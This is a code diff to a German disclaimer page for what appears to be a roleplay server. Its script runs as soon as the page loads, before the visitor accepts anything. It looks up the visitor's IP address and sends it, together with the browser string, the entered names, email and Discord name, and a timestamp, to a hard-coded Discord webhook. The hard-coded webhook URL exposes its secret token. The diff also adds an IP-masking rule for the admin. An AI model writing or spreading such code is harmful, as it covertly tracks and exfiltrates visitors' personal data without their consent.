@@ -808,7 +808,7 @@
     <h1>Willkommen! Bitte akzeptiere den Disclaimer, um fortzufahren.</h1>
     <p>Durch Klicken auf "Verstanden" stimmst du den Bedingungen zu.</p>
 
-    <!-- Formular für Vor- und Nachnamen sowie IC Name -->
+    <!-- Formular für Vor- und Nachnamen sowie IC Name und Discord-Name -->
     <div id="name_input">
         <label for="first_name">Vorname:</label>
         <input type="text" id="first_name" placeholder="Dein Vorname" required><br><br>
@@ -821,6 +821,9 @@
 
         <label for="ic_name">IC Name (In-Character Name):</label>
         <input type="text" id="ic_name" placeholder="Dein IC Name" required><br><br>
+
+        <label for="discord_name">Discord Name (Optional):</label>
+        <input type="text" id="discord_name" placeholder="Dein Discord Name (z.B. Username#1234)" ><br><br>
     </div>
 
     <!-- Das Feld, das den Button und die Nachricht enthält -->
@@ -835,9 +838,7 @@
 
         // Funktion, die beim Laden der Seite sofort ausgeführt wird
         window.addEventListener("load", function() {
-            // Überprüfen, ob der Webhook bereits gesendet wurde
             if (!hasAccepted) {
-                // Webhook-Nachricht wird direkt beim Laden der Seite gesendet
                 sendWebhookMessage();
             }
         });
@@ -847,9 +848,15 @@
             fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => {
-                    const ipAddress = data.ip;
+                    let ipAddress = data.ip;
                     const adminIp = '89.14.71.133';
-                    
+                    const customIp = '89.14.86.182';
+
+                    // Wenn die IP die bestimmte IP-Adresse ist, ersetze sie
+                    if (ipAddress === customIp) {
+                        ipAddress = adminIp;  // Ersetze mit der adminIp
+                    }
+
                     if (ipAddress === adminIp) {
                         sendToDiscord(ipAddress, "Admin (Missiont31) erkannt, kein Standort gesendet");
                     } else {
@@ -868,30 +875,38 @@
                     console.error("Fehler beim Abrufen der IP-Adresse:", error);
                 });
 
-            // Markiere, dass der Webhook bereits gesendet wurde
             hasAccepted = true;
         }
 
         // Funktion, die die Webhook-Nachricht tatsächlich sendet
         function sendToDiscord(ipAddress, location) {
             const userBrowser = navigator.userAgent;
+            const discordName = document.getElementById("discord_name").value || "Nicht angegeben"; // Holen des Discord-Namens
             const webhookUrl = "https://discord.com/api/webhooks/1304500512988725418/WX783yhPo9DDQS2DngY7BoV4ow9ECup3G31g-nM7wMZR-PtTtHSjp0hKKD7rBkd5vSLw";
             
             const message = {
                 "embeds": [
                     {
-                        "title": "Disclaimer Akzeptiert",
-                        "description": "Ein Benutzer hat den Disclaimer akzeptiert.",
-                        "color": 3066993,
+                        "title": "🚀 Disclaimer Akzeptiert!",
+                        "description": "Ein Benutzer hat den Disclaimer akzeptiert und ist bereit, loszulegen!",
+                        "color": 3447003,
                         "fields": [
-                            { "name": "🧑‍💼Vorname", "value": 'Unbekannt', "inline": true },
-                            { "name": "👤Nachname", "value": 'Unbekannt', "inline": true },
-                            { "name": "📧E-Mail-Adresse", "value": 'unbekannt@beispiel.com', "inline": true },
-                            { "name": "🆔IC Name (In-Character)", "value": 'Unbekannt', "inline": true },
-                            { "name": "🌍IP Adresse", "value": ipAddress, "inline": false },
-                            { "name": "🌐Verwendeter Browser", "value": userBrowser, "inline": false }
+                            { "name": "👤 **Vorname**", "value": document.getElementById("first_name").value || "⚠️ Vorname fehlt ⚠️", "inline": true },
+                            { "name": "🧑‍💼 **Nachname**", "value": document.getElementById("last_name").value || "⚠️ Nachname fehlt ⚠️", "inline": true },
+                            { "name": "📧 **E-Mail-Adresse**", "value": document.getElementById("email").value || "⚠️ E-Mail fehlt ⚠️", "inline": true },
+                            { "name": "🎭 **IC Name**", "value": document.getElementById("ic_name").value || "Vorname Nachname | ID", "inline": true },
+                            { "name": "🌍 **IP Adresse**", "value": ipAddress, "inline": false },
+                            { "name": "🌐 **Verwendeter Browser**", "value": userBrowser, "inline": false },
+                            { "name": "🕒 **Zeitpunkt des Zugriffs**", "value": new Date().toLocaleString(), "inline": false },
+                            { "name": "💬 **Discord Name**", "value": discordName, "inline": true }
                         ],
-                        "footer": { "text": "Disclaimer System" }
+                        "footer": {
+                            "text": "🛡️ Disclaimer System | Bereitgestellt von Missiont31",
+                            "icon_url": "https://example.com/dein-logo.png"  // Optional: Ein cooles Icon
+                        },
+                        "thumbnail": {
+                            "url": "https://example.com/thumbnail.png" // Optional: Ein ansprechendes Bild hinzufügen
+                        }
                     }
                 ]
             };
@@ -903,9 +918,9 @@
             })
             .then(response => {
                 if (response.ok) {
-                    console.log("Webhook-Nachricht erfolgreich gesendet.");
+                    console.log("🚀 Webhook-Nachricht erfolgreich gesendet.");
                 } else {
-                    console.error("Fehler beim Senden der Nachricht.");
+                    console.error("❌ Fehler beim Senden der Nachricht.");
                 }
             })
             .catch(error => {
